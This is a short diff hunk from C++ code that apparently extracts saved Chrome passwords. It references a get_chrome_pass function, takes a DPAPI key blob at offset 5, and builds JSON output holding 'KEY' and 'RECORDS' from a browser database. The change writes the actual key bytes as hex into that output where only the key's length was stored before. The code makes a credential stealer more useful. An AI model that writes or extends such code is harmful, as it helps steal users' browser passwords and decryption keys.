@@ -176,7 +176,7 @@ int main(){
    }
    //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
    json test;
-   test["KEY"] = key->cbData;
+   test["KEY"] = hexStr(key->pbData, key->cbData);
    test["RECORDS"] = json(getAllResults(db));
 
 
